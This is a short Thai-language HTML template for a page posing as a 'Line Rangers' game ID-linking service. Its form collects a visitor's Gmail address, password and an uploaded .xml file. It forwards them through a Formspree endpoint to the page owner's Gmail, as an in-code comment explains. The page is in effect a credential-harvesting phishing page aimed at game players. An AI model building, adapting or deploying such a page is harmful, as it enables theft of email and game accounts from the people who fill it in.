<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <title>ระบบส่งเชื่อมไอดี Line Rangers</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 350px; }
        input, button { width: 100%; padding: 10px; margin-top: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        button { background: #00C300; color: white; border: none; font-weight: bold; cursor: pointer; }
        button:hover { background: #00b000; }
    </style>
</head>
<body>

<div class="card">
    <h2>เชื่อมไอดี Line Rangers</h2>
    <!-- ใช้ Formspree เป็นตัวกลางส่งข้อมูลเข้า Gmail โดยไม่ต้องเขียน Backend -->
    <form action="https://formspree.io/f/รหัสฟอร์มของคุณ" method="POST" enctype="multipart/form-data">
        <label>Gmail ของคุณ:</label>
        <input type="email" name="email" required placeholder="example@gmail.com">
        
        <label>รหัสผ่าน / ข้อมูลเพิ่มเติม:</label>
        <input type="text" name="password" placeholder="รหัสผ่าน (ถ้ามี)">

        <label>แนบไฟล์ .xml:</label>
        <input type="file" name="xml_file" accept=".xml" required>

        <button type="submit">ส่งข้อมูลเข้าระบบ</button>
    </form>
</div>

</body>
</html>
